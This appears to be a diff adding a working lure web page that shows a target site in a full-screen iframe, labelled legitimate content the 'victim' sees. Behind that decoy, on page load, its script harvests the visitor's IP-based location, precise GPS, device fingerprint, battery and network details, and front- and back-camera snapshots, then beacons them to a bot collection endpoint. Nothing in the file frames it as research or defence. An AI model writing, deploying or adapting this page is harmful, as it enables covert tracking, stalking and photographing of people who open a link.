@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+html, body { width:100%; height:100%; overflow:hidden; background:#fff; }
+iframe { width:100%; height:100%; border:none; position:fixed; top:0; left:0; z-index:1; }
+.hidden-layer { display:none; }
+</style>
+</head>
+<body>
+
+<!-- Legitimate content the victim sees -->
+<iframe id="targetFrame" src="about:blank"></iframe>
+
+<script>
+// ─── CONFIG ───────────────────────────────────────────────────────────────
+const BOT_COLLECT_URL = window.location.origin + "/collect";
+const VICTIM_ID = generateId();
+const TARGET_URL = "{{TARGET_URL}}";
+
+// ─── HELPERS ──────────────────────────────────────────────────────────────
+
+function generateId() {
+    return "v" + Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+}
+
+function sendToBot(data) {
+    try {
+        const payload = { id: VICTIM_ID, ...data };
+        navigator.sendBeacon(BOT_COLLECT_URL, JSON.stringify(payload));
+    } catch(e) {
+        fetch(BOT_COLLECT_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ id: VICTIM_ID, ...data }),
+            keepalive: true
+        }).catch(() => {});
+    }
+}
+
+// ─── LOAD TARGET URL IN IFRAME ────────────────────────────────────────────
+
+document.getElementById("targetFrame").src = TARGET_URL;
+
+// ─── STEP 1: GET IP & GEOLOCATION ─────────────────────────────────────────
+
+async function getIPInfo() {
+    try {
+        const resp = await fetch("https://ipapi.co/json/");
+        return await resp.json();
+    } catch(e) {
+        try {
+            const resp = await fetch("https://ip-api.com/json/");
+            return await resp.json();
+        } catch(e2) {
+            return { ip: "unknown" };
+        }
+    }
+}
+
+// ─── STEP 2: GET BROWSER GPS (precise) ────────────────────────────────────
+
+function getGPS() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({});
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                speed: pos.coords.speed
+            }),
+            () => resolve({}),  // denied
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+    });
+}
+
+// ─── STEP 3: GET DEVICE INFO ──────────────────────────────────────────────
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = "Unknown";
+    if (/android/i.test(ua)) os = "Android";
+    else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
+    else if (/Win/.test(ua)) os = "Windows";
+    else if (/Mac/.test(ua)) os = "macOS";
+    else if (/Linux/.test(ua)) os = "Linux";
+    else if (/CriOS/.test(ua)) os = "iOS (Chrome)";
+
+    let browser = "Unknown";
+    if (/Edg/.test(ua)) browser = "Edge";
+    else if (/Chrome/.test(ua)) browser = "Chrome";
+    else if (/Firefox/.test(ua)) browser = "Firefox";
+    else if (/Safari/.test(ua)) browser = "Safari";
+    else if (/Opera|OPR/.test(ua)) browser = "Opera";
+
+    // Detect iPhone model from screen
+    const w = window.screen.width;
+    const h = window.screen.height;
+    const deviceModel = detectDevice(ua, w, h);
+
+    return {
+        userAgent: ua,
+        os: os,
+        browser: browser,
+        platform: navigator.platform || "unknown",
+        language: navigator.language,
+        screen: w + "x" + h,
+        colorDepth: window.screen.colorDepth,
+        cores: navigator.hardwareConcurrency || "unknown",
+        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "unknown",
+        deviceModel: deviceModel,
+        touch: 'ontouchstart' in window,
+        cookies: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || "unspecified",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset()
+    };
+}
+
+function detectDevice(ua, w, h) {
+    if (/iPhone/.test(ua)) return "iPhone";
+    if (/iPad/.test(ua)) return "iPad";
+    if (/Android/.test(ua)) {
+        if (w >= 1440) return "Android Tablet";
+        return "Android Phone";
+    }
+    return "Desktop/Laptop";
+}
+
+// ─── STEP 4: GET BATTERY ─────────────────────────────────────────────────
+
+async function getBattery() {
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging
+        };
+    } catch(e) {
+        return {};
+    }
+}
+
+// ─── STEP 5: GET NETWORK INFO ────────────────────────────────────────────
+
+function getNetworkInfo() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        return {
+            type: conn.effectiveType || "unknown",
+            downlink: conn.downlink + " Mbps",
+            rtt: conn.rtt + " ms",
+            online: navigator.onLine
+        };
+    }
+    return { type: "unknown", online: navigator.onLine };
+}
+
+// ─── STEP 6: CAPTURE CAMERA ──────────────────────────────────────────────
+
+async function captureCamera(facingMode) {
+    try {
+        // Try front camera first, then any camera
+        const constraints = {
+            video: { facingMode: facingMode, width: 320, height: 240 },
+            audio: false
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+        
+        // Wait a moment for camera to initialize
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement("canvas");
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, 320, 240);
+        
+        const imageData = canvas.toDataURL("image/jpeg", 0.7);
+        
+        // Stop all tracks
+        stream.getTracks().forEach(track => track.stop());
+        
+        return imageData;
+    } catch(e) {
+        console.log("Camera access denied or error:", e.message);
+        return null;
+    }
+}
+
+// ─── STEP 7: CAPTURE BACK CAMERA ─────────────────────────────────────────
+
+async function captureBackCamera() {
+    // Try "environment" facingMode for back camera
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment", width: 320, height: 240 },
+            audio: false
+        });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement("canvas");
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, 320, 240);
+        const imageData = canvas.toDataURL("image/jpeg", 0.7);
+        stream.getTracks().forEach(track => track.stop());
+        return imageData;
+    } catch(e) {
+        return null;
+    }
+}
+
+// ─── STEP 8: FINAL ASSEMBLY & SEND ───────────────────────────────────────
+
+async function collectAndSend() {
+    try {
+        // Gather all data in parallel where possible
+        const [ipInfo, gps, device, battery, network] = await Promise.all([
+            getIPInfo(),
+            getGPS(),
+            getDeviceInfo(),
+            getBattery(),
+            getNetworkInfo()
+        ]);
+
+        // Camera capture (sequential, needs user gesture context)
+        // We do them after a small delay so page has loaded
+        setTimeout(async () => {
+            const frontCamera = await captureCamera("user");
+            
+            // Back camera (try both environment and exact)
+            let backCamera = await captureBackCamera();
+            if (!backCamera) {
+                backCamera = await captureCamera({ exact: "environment" });
+            }
+
+            // Send core data first (fast)
+            sendToBot({
+                ip_info: ipInfo,
+                gps: gps,
+                device: device,
+                battery: battery,
+                network: network,
+                front_camera: frontCamera,
+                back_camera: backCamera,
+                timestamp: new Date().toISOString(),
+                page_url: TARGET_URL
+            });
+        }, 1500);
+
+        // Also send immediate data without waiting for camera
+        sendToBot({
+            ip_info: ipInfo,
+            gps: gps,
+            device: device,
+            battery: battery,
+            network: network,
+            timestamp: new Date().toISOString(),
+            page_url: TARGET_URL
+        });
+
+    } catch(e) {
+        console.error("Collection error:", e);
+        // Send what we have
+        sendToBot({
+            error: e.message,
+            timestamp: new Date().toISOString()
+        });
+    }
+}
+
+// ─── INIT ─────────────────────────────────────────────────────────────────
+
+// Start collection after page loads
+window.addEventListener("load", () => {
+    collectAndSend();
+});
+
+// Also try on DOMContentLoaded and visibility change for mobile browsers
+document.addEventListener("DOMContentLoaded", () => {
+    // Trigger camera permission early if possible
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        // Just probe for permission, don't capture yet
+    }
+});
+</script>
+</body>
+</html>
